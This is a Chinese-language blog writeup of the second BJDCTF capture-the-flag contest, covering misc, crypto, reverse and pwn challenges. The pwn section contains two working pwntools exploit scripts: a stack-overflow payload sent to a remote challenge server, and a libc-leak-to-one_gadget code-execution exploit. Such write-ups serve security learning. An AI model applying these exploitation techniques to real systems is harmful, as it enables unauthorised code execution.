@@ -1,0 +1,236 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>第二届BJDCTF Writeup | SkYe231 Blog</title><meta name="keywords" content="Writeup,BJDCTF"><meta name="author" content="SkYe231"><meta name="copyright" content="SkYe231"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Misc最简单的misczip 压缩包伪加密，改完标志位，解压得到文件 secret 。winhex 打开发现头部有 IHDR 标志，盲猜一个 PNG 文件，补一个文件头 89504E47 ，改后缀名。  隔壁是作者，重点是下面。十六进制转 Ascii 得到 flag 。 A_Beautiful_Picture下载一个 png ，改高度得到 flag 。  EasyBaBajpg 19.9M 你见">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届BJDCTF Writeup">
+<meta property="og:url" content="https://skyedai910.github.io/archives/11/index.html">
+<meta property="og:site_name" content="SkYe231 Blog">
+<meta property="og:description" content="Misc最简单的misczip 压缩包伪加密，改完标志位，解压得到文件 secret 。winhex 打开发现头部有 IHDR 标志，盲猜一个 PNG 文件，补一个文件头 89504E47 ，改后缀名。  隔壁是作者，重点是下面。十六进制转 Ascii 得到 flag 。 A_Beautiful_Picture下载一个 png ，改高度得到 flag 。  EasyBaBajpg 19.9M 你见">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://skyedai910.github.io/img/default_cover1.png">
+<meta property="article:published_time" content="2020-03-23T05:52:00.000Z">
+<meta property="article:modified_time" content="2021-03-26T08:30:24.918Z">
+<meta property="article:author" content="SkYe231">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="BJDCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://skyedai910.github.io/img/default_cover1.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://skyedai910.github.io/archives/11/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="cEoYWheDVkHH-Yp4JSBTTpaID2pIW7q58RgTg6h1iOs"/><meta name="baidu-site-verification" content="code-Xeczgxl48H"/><meta name="360-site-verification" content="95a7ddcc661de175b37bc99a62cf5c9e"/><meta name="yandex-verification" content="fc0ae24e23c94b47"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8184ae9371af7cedfa47d27c247e16b8";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-154693872-1"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-154693872-1');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"这篇文章距离上次更新已经","messageNext":"天，内容可能已经过时了。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":200,"languages":{"author":"作者: SkYe231","link":"链接: ","source":"来源: SkYe231 Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isanchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-26 16:30:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="SkYe231 Blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">66</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default_cover1.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">SkYe231 Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 目录</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">第二届BJDCTF Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-23T05:52:00.000Z" title="发表于 2020-03-23 13:52:00">2020-03-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-26T08:30:24.918Z" title="更新于 2021-03-26 16:30:24">2021-03-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">803</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="最简单的misc"><a href="#最简单的misc" class="headerlink" title="最简单的misc"></a>最简单的misc</h2><p>zip 压缩包伪加密，改完标志位，解压得到文件 secret 。winhex 打开发现头部有 IHDR 标志，<del>盲猜</del>一个 PNG 文件，补一个文件头 89504E47 ，改后缀名。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323100003.png"></p>
+<p>隔壁是作者，重点是下面。十六进制转 Ascii 得到 flag 。</p>
+<h2 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h2><p>下载一个 png ，改高度得到 flag 。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323100605.png"></p>
+<h2 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h2><p>jpg 19.9M 你见过么？反正我没见过。binwalk 一下没有东西，foremost 一下出来一个压缩包，里面还是一个大得出奇的 jpg 。winhex 看了一下 avi 文件，改后缀名，得到一段鬼畜，pr 逐帧查看视频，找到四个二维码，扫码。十六进制转 Ascii 码，转码后调整顺序得到 flag 。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200324001949.png"></p>
+<h2 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h2><p>认真填写才能获得 flag</p>
+<h2 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h2><p><del>用 stegdetect 检查 jpeg 文件，发现 jphide 加密。</del></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegdetect.exe <span class="literal">-s</span> <span class="number">20</span> xiaojiejie.jpeg</span><br></pre></td></tr></table></figure>
+<p><del>然后爆破密码？</del></p>
+<p>对，没错想多了。只需要这样：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323221603.png"></p>
+<h2 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h2><p>winhex 打开文件，仔细看，就能获得 flag 。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200323110134.png"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>base64 加密</p>
+<h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h2><p>?：0 。?：1 。二进制再转字符串。</p>
+<h2 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h2><p>十六进制转 Ascii ，再转维吉尼亚密码。密钥在 Ascii 解码后字符串前面</p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h2><p>IDA打开，shift + F12 查看字符串，得到 flag 。</p>
+<h2 id="8086"><a href="#8086" class="headerlink" title="8086"></a>8086</h2><p>asm8086 单片机么？这个比较曲折，用物理机 IDA 逆向出奇奇怪怪的指令，用虚拟机 IDA 逆向就能看得懂大半部分。加密方式就是异或，密文是 aUDuTZWjQGjzZWz 的值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lea     bx, aUDuTZWjQGjzZWz ; <span class="string">&quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;&quot;</span></span><br><span class="line">loc_10039:                                               mov     di, cx</span><br><span class="line">dec     di</span><br><span class="line"><span class="keyword">xor</span>     byte ptr [bx+di], <span class="number">1F</span>h	<span class="comment">//异或0x1f</span></span><br><span class="line">loop    loc_10039</span><br><span class="line">lea     dx, aUDuTZWjQGjzZWz ;</span><br><span class="line">mov     ah, <span class="number">9</span></span><br><span class="line"><span class="keyword">int</span>     <span class="number">21</span>h</span><br></pre></td></tr></table></figure>
+
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = [<span class="number">0x5D</span>, <span class="number">0x55</span>, <span class="number">0x5B</span>, <span class="number">0x64</span>, <span class="number">0x75</span>, <span class="number">0x7E</span>, <span class="number">0x7C</span>, <span class="number">0x74</span>, <span class="number">0x40</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x40</span>, <span class="number">0x77</span>, <span class="number">0x6A</span>, <span class="number">0x2E</span>, <span class="number">0x7D</span>, <span class="number">0x2E</span>, <span class="number">0x7E</span>,</span><br><span class="line">          <span class="number">0x71</span>, <span class="number">0x40</span>, <span class="number">0x67</span>, <span class="number">0x6A</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x40</span>, <span class="number">0x77</span>, <span class="number">0x7A</span>, <span class="number">0x71</span>, <span class="number">0x57</span>, <span class="number">0x7E</span>, <span class="number">0x2F</span>, <span class="number">0x62</span>, <span class="number">0x3B</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(m[i] ^ <span class="number">0x1F</span>)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h2><p>跟攻防世界的一道题类似。漏洞在 name_check() ，会将传入参数 s strcpy 给 &amp;dest 造成溢出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">name_check</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+7h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,My dear %s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(&amp;dest, s);	# 漏洞</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29570</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./r2t3&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./r2t3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./r2t3&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x11</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p32(<span class="number">0x8048430</span>)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(<span class="number">0x8048760</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">256</span>+<span class="number">6</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;My&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>感觉在哪里见过？</p>
+<p>开局给提示：printf 函数地址，然后要求输入，输入完成后，会执行输入地址。所以依据给出地址计算 offset ，算出 one_gadget 真实地址输入。</p>
+<p>one_gadget 输入应该是十进制数，一开始 p64() ，做不出来。</p>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./one_gadget&quot;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./one_gadget&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.29.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;u:&quot;</span>)</span><br><span class="line">printf_got = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;printf_got:&quot;</span>+<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">libc_base = printf_got - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x106ef8</span> </span><br><span class="line">log.success(<span class="string">&quot;one_gadget:&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;gadget:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><strong>官方WP</strong>：<a target="_blank" rel="noopener" href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF">https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">SkYe231</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://skyedai910.github.io/archives/11/">https://skyedai910.github.io/archives/11/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://skyedai910.github.io" target="_blank">SkYe231 Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a><a class="post-meta__tags" href="/tags/BJDCTF/">BJDCTF</a></div><div class="post_share"><div class="social-share" data-image="/img/default_cover1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/4a91183a/"><img class="prev-cover" data-lazy-src="/img/default_cover1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">midnight-sun-ctf-2020-quals-writeup</div></div></a></div><div class="next-post pull-right"><a href="/archives/d7d152e1/"><img class="next-cover" data-lazy-src="/img/default_cover4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">栈迁移学习（新）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/205/" title="2020 CISCN Writeup"><img class="cover" data-lazy-src="/img/default_cover5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 CISCN Writeup</div></div></a></div><div><a href="/archives/22e3ff4c/" title="2020 De1CTF Writeup"><img class="cover" data-lazy-src="/img/default_cover2.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 De1CTF Writeup</div></div></a></div><div><a href="/archives/18e23abd/" title="2020 RedpwnCTF Writeup"><img class="cover" data-lazy-src="/img/default_cover4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 RedpwnCTF Writeup</div></div></a></div><div><a href="/archives/216/" title="2020 SWPUCTF 部分Pwn Writeup"><img class="cover" data-lazy-src="/img/default_cover1.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 SWPUCTF 部分Pwn Writeup</div></div></a></div><div><a href="/archives/215/" title="2020 湖湘杯 PWN WriteUp"><img class="cover" data-lazy-src="/img/default_cover4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 湖湘杯 PWN WriteUp</div></div></a></div><div><a href="/archives/212/" title="2020 西普杯 信息安全铁人三项 第四赛区 Writeup"><img class="cover" data-lazy-src="/img/default_cover4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 西普杯 信息安全铁人三项 第四赛区 Writeup</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">SkYe231</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">66</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/skyedai910" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:skye231@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">请修改默认公告</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84misc"><span class="toc-number">1.1.</span> <span class="toc-text">最简单的misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-Beautiful-Picture"><span class="toc-number">1.2.</span> <span class="toc-text">A_Beautiful_Picture</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 